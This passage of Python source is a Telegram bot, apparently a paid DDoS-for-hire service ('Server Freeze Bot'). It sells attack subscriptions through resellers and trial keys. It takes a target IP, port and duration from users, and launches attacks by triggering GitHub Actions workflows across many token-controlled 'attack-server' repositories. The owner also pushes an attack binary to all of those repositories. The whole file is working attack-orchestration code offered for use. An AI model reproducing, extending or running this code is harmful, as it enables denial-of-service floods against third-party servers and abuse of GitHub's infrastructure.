                chat_id=int(owner_id),
                text=f"📢 **NEW ACCESS REQUEST**\n\n"
                     f"👤 User: @{username}\n"
                     f"🆔 ID: `{user_id}`\n"
                     f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                     f"Use /start to view requests.",
                parse_mode='Markdown'
            )
        except:
            pass

async def approve_request(query, admin_id, req_user_id):
    if not (is_owner(admin_id) or is_admin(admin_id)):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    pending = load_pending_users()
    req_data = None
    
    for req in pending:
        if req['user_id'] == req_user_id:
            req_data = req
            pending.remove(req)
            break
    
    if not req_data:
        await query.answer("❌ Request not found!", show_alert=True)
        return
    
    user_states[admin_id] = {
        "state": WAITING_FOR_DAYS,
        "action": "approve_request",
        "data": {"user_id": req_user_id, "username": req_data.get('username')}
    }
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        f"✅ **APPROVING**\n\n@{req_data.get('username')}\n🆔 {req_user_id}\n\nEnter days:",
        reply_markup=get_cancel_keyboard(),
        parse_mode='Markdown'
    )

async def reject_request(query, admin_id, req_user_id):
    if not (is_owner(admin_id) or is_admin(admin_id)):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    pending = load_pending_users()
    req_data = None
    
    for req in pending:
        if req['user_id'] == req_user_id:
            req_data = req
            pending.remove(req)
            break
    
    if not req_data:
        await query.answer("❌ Not found!", show_alert=True)
        return
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        f"❌ **REJECTED**\n\n@{req_data.get('username')}",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )

# Init functions for various operations
async def init_add_user(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_USER_ID, "action": "add", "data": {}}
    await query.edit_message_text("➕ **ADD USER**\n\nEnter User ID:", reply_markup=get_cancel_keyboard())

async def init_remove_user(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_REMOVE_ID, "action": "remove"}
    await query.edit_message_text("➖ **REMOVE USER**\n\nEnter User ID:", reply_markup=get_cancel_keyboard())

async def show_users_list(query):
    if not approved_users:
        text = "📭 No users yet."
    else:
        text = "👥 **USERS**\n\n"
        for i, (uid, data) in enumerate(list(approved_users.items())[:20], 1):
            username = data.get('username', 'Unknown')
            remaining = format_time_remaining(data.get('expiry_date', ''))
            text += f"{i}. @{username}\n   🆔 {uid}\n   ⏰ {remaining}\n\n"
        
        if len(approved_users) > 20:
            text += f"... and {len(approved_users) - 20} more"
        
        text += f"\n📊 Total: {len(approved_users)}"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def init_add_server(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_TOKEN}
    await query.edit_message_text("➕ **ADD SERVER**\n\nSend GitHub token:", reply_markup=get_cancel_keyboard())

async def init_remove_server(query, user_id):
    if not github_tokens:
        await query.edit_message_text("📭 No servers.", reply_markup=get_back_keyboard())
        return
    
    text = "🔑 **SELECT SERVER**\n\n"
    for i, token_data in enumerate(github_tokens, 1):
        text += f"{i}. {token_data['username']}\n"
    
    text += "\nReply with number:"
    user_states[user_id] = {"state": "select_server_remove"}
    await query.edit_message_text(text, reply_markup=get_cancel_keyboard())

async def show_servers_list(query):
    if not github_tokens:
        text = "📭 No servers."
    else:
        text = "🔑 **SERVERS**\n\n"
        for i, token_data in enumerate(github_tokens, 1):
            text += f"{i}. {token_data['username']}\n   📁 {token_data['repo']}\n\n"
        text += f"📊 Total: {len(github_tokens)}"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def init_upload_binary(query, user_id):
    if not github_tokens:
        await query.edit_message_text("❌ No servers!", reply_markup=get_back_keyboard())
        return
    
    user_states[user_id] = {"state": WAITING_FOR_BINARY}
    await query.edit_message_text(
        f"📤 **UPLOAD BINARY**\n\nSend file (will be '{BINARY_FILE_NAME}'):",
        reply_markup=get_cancel_keyboard()
    )

async def init_set_cooldown(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_COOLDOWN}
    await query.edit_message_text(
        f"⏱️ **SET COOLDOWN**\n\nCurrent: {COOLDOWN_DURATION}s\n\nEnter new (seconds):",
        reply_markup=get_cancel_keyboard()
    )

async def init_set_max_attacks(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_MAX_ATTACKS}
    await query.edit_message_text(
        f"🎯 **SET MAX**\n\nCurrent: {MAX_ATTACKS}\n\nEnter new:",
        reply_markup=get_cancel_keyboard()
    )

async def toggle_maintenance(query, user_id):
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    
    status = "ON ✅" if MAINTENANCE_MODE else "OFF ❌"
    await query.answer(f"Maintenance: {status}", show_alert=True)
    await show_settings(query)

async def init_gen_trial_key(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_TRIAL_HOURS}
    await query.edit_message_text("🎁 **GENERATE KEY**\n\nEnter hours:", reply_markup=get_cancel_keyboard())

async def init_redeem_key(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_REDEEM_KEY}
    await query.edit_message_text("🎁 **REDEEM KEY**\n\nEnter key:", reply_markup=get_cancel_keyboard())

async def start_broadcast(query, user_id):
    if not is_owner(user_id):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    user_states[user_id] = {"state": WAITING_FOR_BROADCAST}
    await query.edit_message_text("📢 **BROADCAST**\n\nSend message:", reply_markup=get_cancel_keyboard())

async def init_add_admin(query, user_id):
    user_states[user_id] = {"state": "add_admin_id"}
    await query.edit_message_text("➕ **ADD ADMIN**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def init_remove_admin(query, user_id):
    user_states[user_id] = {"state": "remove_admin_id"}
    await query.edit_message_text("➖ **REMOVE ADMIN**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def show_admins_list(query):
    if not admins:
        text = "📭 No admins."
    else:
        text = "🛡️ **ADMINS**\n\n"
        for i, (admin_id, data) in enumerate(admins.items(), 1):
            text += f"{i}. @{data.get('username', 'Unknown')}\n   🆔 {admin_id}\n\n"
        text += f"📊 Total: {len(admins)}"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def init_add_reseller(query, user_id):
    user_states[user_id] = {"state": "add_reseller_id"}
    await query.edit_message_text("➕ **ADD RESELLER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def init_remove_reseller(query, user_id):
    user_states[user_id] = {"state": "remove_reseller_id"}
    await query.edit_message_text("➖ **REMOVE RESELLER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def init_add_reseller_credits(query, user_id):
    user_states[user_id] = {"state": "add_credits_id"}
    await query.edit_message_text("💳 **ADD CREDITS**\n\nEnter Reseller ID:", reply_markup=get_cancel_keyboard())

async def show_resellers_list(query):
    if not resellers:
        text = "📭 No resellers."
    else:
        text = "💰 **RESELLERS**\n\n"
        for i, (res_id, data) in enumerate(resellers.items(), 1):
            text += f"{i}. @{data.get('username', 'Unknown')}\n   💳 {data.get('credits', 0)} days\n\n"
        text += f"📊 Total: {len(resellers)}"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def init_reseller_add_user(query, user_id):
    user_states[user_id] = {"state": "reseller_add_user_id"}
    await query.edit_message_text("➕ **ADD USER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def init_reseller_remove_user(query, user_id):
    user_states[user_id] = {"state": "reseller_remove_user_id"}
    await query.edit_message_text("➖ **REMOVE USER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())

async def show_reseller_users(query, user_id):
    reseller_users = [uid for uid, data in approved_users.items() if data.get('added_by') == str(user_id)]
    
    if not reseller_users:
        text = "📭 No users yet."
    else:
        text = "👥 **YOUR USERS**\n\n"
        for i, uid in enumerate(reseller_users[:20], 1):
            data = approved_users[uid]
            text += f"{i}. @{data.get('username', 'Unknown')}\n   ⏰ {format_time_remaining(data['expiry_date'])}\n\n"
        
        if len(reseller_users) > 20:
            text += f"... and {len(reseller_users) - 20} more"
        
        text += f"\n📊 Total: {len(reseller_users)}"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def show_reseller_credits(query, user_id):
    reseller_data = resellers[str(user_id)]
    text = f"""
💳 **YOUR CREDITS**

Credits: {reseller_data.get('credits', 0)} days
Users Added: {reseller_data.get('users_added', 0)}
"""
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

async def show_reseller_prices(query):
    text = "💰 **RESELLER PRICES**\n\n"
    for days, price in RESELLER_PRICES.items():
        text += f"• {days} days: ₹{price}\n"
    
    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')

logger.info("✅ Part 5: Action functions loaded")

# Part 6: Message Handlers and Main Function

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    state = state_info.get("state")
    
    # Attack flow
    if state == WAITING_FOR_IP:
        user_states[user_id]["data"]["target"] = text
        user_states[user_id]["state"] = WAITING_FOR_PORT
        await update.message.reply_text("🔌 Enter port:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_PORT:
        try:
            port = int(text)
            user_states[user_id]["data"]["port"] = port
            user_states[user_id]["state"] = WAITING_FOR_TIME
            await update.message.reply_text("⏱️ Enter duration (seconds):", reply_markup=get_cancel_keyboard())
        except:
            await update.message.reply_text("❌ Invalid port!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_TIME:
        try:
            duration = int(text)
            if duration < 1 or duration > 300:
                await update.message.reply_text("❌ Duration must be 1-300s!", reply_markup=get_cancel_keyboard())
                return
            
            target = state_info["data"]["target"]
            port = state_info["data"]["port"]
            
            await launch_attack(update.message, user_id, target, port, duration)
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid duration!", reply_markup=get_cancel_keyboard())
    
    # User management
    elif state == WAITING_FOR_USER_ID:
        try:
            target_id = str(int(text))
            user_states[user_id]["data"]["target_id"] = target_id
            user_states[user_id]["state"] = WAITING_FOR_DAYS
            await update.message.reply_text("📅 Enter days:", reply_markup=get_cancel_keyboard())
        except:
            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_DAYS:
        try:
            days = int(text)
            if days < 1:
                await update.message.reply_text("❌ At least 1 day!", reply_markup=get_cancel_keyboard())
                return
            
            target_id = state_info["data"].get("target_id")
            expiry = datetime.now() + timedelta(days=days)
            
            approved_users[target_id] = {
                "username": f"user_{target_id}",
                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "plan": f"{days} days"
            }
            
            save_approved_users(approved_users)
            
            await update.message.reply_text(
                f"✅ **USER ADDED**\n\n🆔 {target_id}\n📅 {days} days",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_REMOVE_ID:
        try:
            target_id = str(int(text))
            if target_id in approved_users:
                del approved_users[target_id]
                save_approved_users(approved_users)
                await update.message.reply_text(
                    f"✅ **REMOVED**\n\n🆔 {target_id}",
                    reply_markup=get_back_keyboard(),
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Not found!", reply_markup=get_back_keyboard())
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    # Settings
    elif state == WAITING_FOR_COOLDOWN:
        try:
            global COOLDOWN_DURATION
            cooldown = int(text)
            if cooldown < 10 or cooldown > 300:
                await update.message.reply_text("❌ Must be 10-300s!", reply_markup=get_cancel_keyboard())
                return
            
            COOLDOWN_DURATION = cooldown
            save_cooldown(cooldown)
            await update.message.reply_text(
                f"✅ **COOLDOWN SET**\n\n⏱️ {cooldown}s",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_MAX_ATTACKS:
        try:
            global MAX_ATTACKS
            max_att = int(text)
            if max_att < 1 or max_att > 100:
                await update.message.reply_text("❌ Must be 1-100!", reply_markup=get_cancel_keyboard())
                return
            
            MAX_ATTACKS = max_att
            save_max_attacks(max_att)
            await update.message.reply_text(
                f"✅ **MAX ATTACKS SET**\n\n🎯 {max_att}",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
    
    # Trial key generation
    elif state == WAITING_FOR_TRIAL_HOURS:
        try:
            hours = int(text)
            if hours < 1 or hours > 168:
                await update.message.reply_text("❌ Must be 1-168 hours!", reply_markup=get_cancel_keyboard())
                return
            
            key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
            trial_keys[key] = {
                "hours": hours,
                "generated_by": user_id,
                "generated_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "used": False
            }
            save_trial_keys(trial_keys)
            
            await update.message.reply_text(
                f"✅ **KEY GENERATED**\n\n🎁 Key: `{key}`\n⏰ {hours}h",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
    
    # Broadcast
    elif state == WAITING_FOR_BROADCAST:
        success = 0
        failed = 0
        
        for target_id in approved_users.keys():
            try:
                await context.bot.send_message(chat_id=int(target_id), text=text)
                success += 1
            except:
                failed += 1
        
        await update.message.reply_text(
            f"✅ **BROADCAST SENT**\n\n✅ {success}\n❌ {failed}",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        user_states[user_id] = None
    
    # Token management
    elif state == WAITING_FOR_TOKEN:
        token = text
        try:
            g = Github(token)
            user = g.get_user()
            username = user.login
            repo_name = "attack-server"
            
            try:
                repo = g.get_user().get_repo(repo_name)
            except:
                repo = g.get_user().create_repo(repo_name)
            
            github_tokens.append({
                "token": token,
                "username": username,
                "repo": f"{username}/{repo_name}",
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "active"
            })
            save_github_tokens(github_tokens)
            
            await update.message.reply_text(
                f"✅ **SERVER ADDED**\n\n👤 {username}\n📊 Total: {len(github_tokens)}",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_cancel_keyboard())

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    if state_info.get("state") != WAITING_FOR_BINARY:
        return
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ ACCESS DENIED")
        return
    
    progress_msg = await update.message.reply_text("📥 Downloading...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📤 Uploading to {len(github_tokens)} servers...")
        
        success = 0
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                
                try:
                    existing = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                return True
            except:
                return False
        
        threads = []
        results = []
        
        def thread_upload(token_data):
            results.append(upload_to_repo(token_data))
        
        for token_data in github_tokens:
            t = threading.Thread(target=thread_upload, args=(token_data,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        success = sum(results)
        os.remove(file_path)
        
        await progress_msg.edit_text(
            f"✅ **UPLOAD DONE**\n\n✅ {success}\n❌ {len(github_tokens) - success}\n📦 {file_size} bytes",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        user_states[user_id] = None
    except Exception as e:
        await progress_msg.edit_text(f"❌ Error: {str(e)}", reply_markup=get_back_keyboard())
        user_states[user_id] = None

async def launch_attack(message, user_id, target, port, duration):
    global current_attack, cooldown_until
    
    if not github_tokens:
        await message.reply_text("❌ No servers!", reply_markup=get_back_keyboard())
        return
    
    progress = await message.reply_text("🚀 Launching attack...")
    
    current_attack = {
        "target": target,
        "port": port,
        "duration": duration,
        "user_id": user_id,
        "start_time": time.time()
    }
    save_attack_state()
    
    if user_id not in user_attack_counts:
        user_attack_counts[user_id] = 0
    user_attack_counts[user_id] += 1
    
    def run_attack(token_data):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            workflow = repo.get_workflow("main.yml")
            workflow.create_dispatch(
                ref="main",
                inputs={"target": target, "port": str(port), "time": str(duration)}
            )
        except:
            pass
    
    threads = []
    for token_data in github_tokens:
        t = threading.Thread(target=run_attack, args=(token_data,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()
    
    await progress.edit_text(
        f"✅ **ATTACK LAUNCHED**\n\n🎯 {target}\n🔌 {port}\n⏱️ {duration}s\n🔑 {len(github_tokens)} servers\n\n⏳ Cooldown: {COOLDOWN_DURATION}s",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )
    
    import asyncio
    await asyncio.sleep(duration)
    
    if current_attack and current_attack.get('user_id') == user_id:
        current_attack = None
        save_attack_state()

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("=" * 50)
    print("🤖 SERVER FREEZE BOT STARTED")
    print("=" * 50)
    print(f"👑 Owners: {len(owners)}")
    print(f"🛡️ Admins: {len(admins)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"👥 Users: {len(approved_users)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max Attacks: {MAX_ATTACKS}")
    print("=" * 50)
    
    application.run_polling()

if __name__ == '__main__':
    main()

logger.info("✅ Part 6: Message handlers and main loaded")
        
